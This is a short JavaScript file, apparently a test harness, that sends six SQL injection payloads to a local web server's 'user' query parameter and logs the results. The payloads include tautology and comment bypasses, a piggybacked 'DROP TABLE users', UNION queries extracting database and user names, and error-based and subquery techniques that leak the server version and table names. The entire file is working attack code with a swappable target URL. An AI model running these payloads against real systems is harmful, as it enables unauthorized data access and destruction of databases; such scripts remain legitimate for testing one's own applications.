const axios = require('axios');

const baseUrl = 'http://localhost:3000';

// Tautology attack
const tautologyAttack = async () => {
  const url = `${baseUrl}/?user=admin' OR '1'='1`;
  try {
    const response = await axios.get(url);
    console.log('Tautology Attack Results:');
    console.log(response.data);
  } catch (error) {
    console.error('Tautology Attack Failed:', error.message);
  }
};

// End of line comment attack
const eolCommentAttack = async () => {
  const url = `${baseUrl}/?user=admin' --`;
  try {
    const response = await axios.get(url);
    console.log('End of Line Comment Attack Results:');
    console.log(response.data);
  } catch (error) {
    console.error('End of Line Comment Attack Failed:', error.message);
  }
};

// Piggybacked query attack
const piggybackedQueryAttack = async () => {
  const url = `${baseUrl}/?user=admin'; DROP TABLE users; --`;
  try {
    const response = await axios.get(url);
    console.log('Piggybacked Query Attack Results:');
    console.log(response.data);
  } catch (error) {
    console.error('Piggybacked Query Attack Failed:', error.message);
  }
};

// Union-based SQL Injection attack
const unionAttack = async () => {
  const url = `${baseUrl}/?user=admin' UNION SELECT null, database(), user() --`;
  try {
    const response = await axios.get(url);
    console.log('Union-Based SQL Injection Attack Results:');
    console.log(response.data);
  } catch (error) {
    console.error('Union-Based SQL Injection Attack Failed:', error.message);
  }
};

// Error-based SQL Injection attack
const errorBasedAttack = async () => {
  const url = `${baseUrl}/?user=admin' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --`;
  try {
    const response = await axios.get(url);
    console.log('Error-Based SQL Injection Attack Results:');
    console.log(response.data);
  } catch (error) {
    console.error('Error-Based SQL Injection Attack Failed:', error.message);
  }
};

// Subquery SQL Injection attack
const subqueryAttack = async () => {
  const url = `${baseUrl}/?user=admin' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --`;
  try {
    const response = await axios.get(url);
    console.log('Subquery SQL Injection Attack Results:');
    console.log(response.data);
  } catch (error) {
    console.error('Subquery SQL Injection Attack Failed:', error.message);
  }
};

const runAttacks = async () => {
  await tautologyAttack();
  await eolCommentAttack();
  await piggybackedQueryAttack();
  await unionAttack();
  await errorBasedAttack();
  await subqueryAttack();
};

runAttacks();
